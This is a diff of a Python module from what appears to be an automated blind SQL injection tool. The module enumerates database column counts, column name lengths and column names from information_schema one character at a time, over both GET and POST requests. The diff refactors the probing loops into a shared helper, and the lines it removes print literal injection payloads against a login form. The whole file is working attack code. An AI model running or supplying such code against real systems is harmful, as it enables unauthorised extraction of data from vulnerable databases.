@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding:utf-8 -*-
-from config import UnpackFunction
+from sqlier.config import UnpackFunction
+from lib.dealpayload import build_injection
 from lib.log import logger
 from tables import SqliTables
 from tqdm import trange
@@ -87,17 +88,12 @@ class SqliColumns(SqliTables):
                         logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                         logger.debug("Start table's %s column amount sqli..." % table_name)
 
-                        for i in trange(100, desc='Column amount sqli', leave=False):
-                            # 先注columns的数量
-                            # payload = "user=user1' %26%26 (SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit 0,1) > " + repr(
-                            #     i) + "))%23&passwd=ddog123&submit=Log+In"
-                            payload = self.dealpayload.construct_build_payload(select="COUNT(column_name)",
-                                                                               source="information_schema.columns",
-                                                                               conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                                               compare=i)
-                            if self.Data.GetBuildData(payload, self.len) == 0:
-                                columns_number = i
-                                break
+                        retVal = build_injection(select="COUNT(column_name)",
+                                                 source="information_schema.columns",
+                                                 conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                 dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                                 isCount=True, sqlirequest=self.sqlirequest)
+                        columns_number = int(retVal)
 
                         logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                         logger.info("[*] columns_number: %d" % columns_number)
@@ -105,20 +101,15 @@ class SqliColumns(SqliTables):
                         for i in range(0, int(columns_number)):
                             # 然后注 columns_number 的 length
                             logger.debug("Start %dth column length sqli..." % (i + 1))
-                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
-                                # payload = "user=user1' %26%26 (select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
-                                #     i) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
-                                payload = self.dealpayload.construct_build_payload(select="length(column_name)",
-                                                                                   source="information_schema.columns",
-                                                                                   conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                                                   limit=i,
-                                                                                   compare=j)
-                                if self.Data.GetBuildData(payload, self.len) == 0:
-                                    column_name_len = j
-                                    break
-                                elif j == 50:
-                                    logger.error("Column length > 50...")
-                                    column_name_len = 50
+
+                            retVal = build_injection(select="length(column_name)",
+                                                     source="information_schema.columns",
+                                                     conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                     limit=i,
+                                                     dealpayload=self.dealpayload, data=self.Data,
+                                                     lens=self.len,
+                                                     isCount=True, sqlirequest=self.sqlirequest)
+                            column_name_len = int(retVal)
 
                             logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                             logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
@@ -127,20 +118,15 @@ class SqliColumns(SqliTables):
                             # 清空column_name
                             column_name = ""
                             logger.debug("Start %dth column sqli..." % (i + 1))
+
                             for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
-                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
-                                                leave=False):
-                                    # payload = "user=user1' %26%26 (select ((SELECT ascii(substring(column_name," + repr(
-                                    #     j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
-                                    #     i) + ",1) >" + repr(k + 30) + "))%23&passwd=ddog123&submit=Log+In"
-                                    payload = self.dealpayload.construct_build_payload(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
-                                                                                       source="information_schema.columns",
-                                                                                       conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                                                       limit=i,
-                                                                                       compare=(k + 30))
-                                    if self.Data.GetBuildData(payload, self.len) == 0:
-                                        column_name += chr(int(k + 30))
-                                        break
+                                retVal = build_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
+                                                         source="information_schema.columns",
+                                                         conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                         limit=i,
+                                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                                         isStrings=True, sqlirequest=self.sqlirequest)
+                                column_name += chr(retVal)
 
                             logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
 
@@ -276,18 +262,12 @@ class SqliColumns(SqliTables):
                         logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                         logger.debug("Start table's %s column amount sqli..." % table_name)
 
-                        for i in trange(100, desc='Column amount sqli', leave=False):
-                            # 先注columns的数量
-                            # payload = {
-                            #     "user": "user1' && (SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit 0,1) > " + repr(
-                            #         i) + "))#", "passwd": "ddog123"}
-                            payload = self.dealpayload.construct_build_payload(select="COUNT(column_name)",
-                                                                               source="information_schema.columns",
-                                                                               conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                                               compare=i)
-                            if self.Data.PostBuildData(payload, self.len) == 0:
-                                columns_number = i
-                                break
+                        retVal = build_injection(select="COUNT(column_name)",
+                                                 source="information_schema.columns",
+                                                 conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                 dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                                 isCount=True, sqlirequest=self.sqlirequest)
+                        columns_number = int(retVal)
 
                         logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                         logger.info("[*] columns_number: %d" % columns_number)
@@ -295,21 +275,15 @@ class SqliColumns(SqliTables):
                         for i in range(0, int(columns_number)):
                             # 然后注 columns_number 的 length
                             logger.debug("Start %dth column length sqli..." % (i + 1))
-                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
-                                # payload = {
-                                #     "user": "user1' && (select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
-                                #         i) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
-                                payload = self.dealpayload.construct_build_payload(select="length(column_name)",
-                                                                                   source="information_schema.columns",
-                                                                                   conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                                                   limit=i,
-                                                                                   compare=j)
-                                if self.Data.PostBuildData(payload, self.len) == 0:
-                                    column_name_len = j
-                                    break
-                                elif j == 50:
-                                    logger.error("Column length > 50...")
-                                    column_name_len = 50
+
+                            retVal = build_injection(select="length(column_name)",
+                                                     source="information_schema.columns",
+                                                     conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                     limit=i,
+                                                     dealpayload=self.dealpayload, data=self.Data,
+                                                     lens=self.len,
+                                                     isCount=True, sqlirequest=self.sqlirequest)
+                            column_name_len = int(retVal)
 
                             logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                             logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
@@ -319,20 +293,13 @@ class SqliColumns(SqliTables):
                             column_name = ""
                             logger.debug("Start %dth column sqli..." % (i + 1))
                             for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
-                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
-                                                leave=False):
-                                    # payload = {"user": "user1' && (select ((SELECT ascii(substring(column_name," + repr(
-                                    #     j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
-                                    #     i) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
-                                    payload = self.dealpayload.construct_build_payload(
-                                        select="ascii(substring(column_name," + repr(j + 1) + ",1))",
-                                        source="information_schema.columns",
-                                        conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                        limit=i,
-                                        compare=(k + 30))
-                                    if self.Data.PostBuildData(payload, self.len) == 0:
-                                        column_name += chr(int(k + 30))
-                                        break
+                                retVal = build_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
+                                                         source="information_schema.columns",
+                                                         conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                         limit=i,
+                                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                                         isStrings=True, sqlirequest=self.sqlirequest)
+                                column_name += chr(retVal)
 
                             logger.debug(
                                 "%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
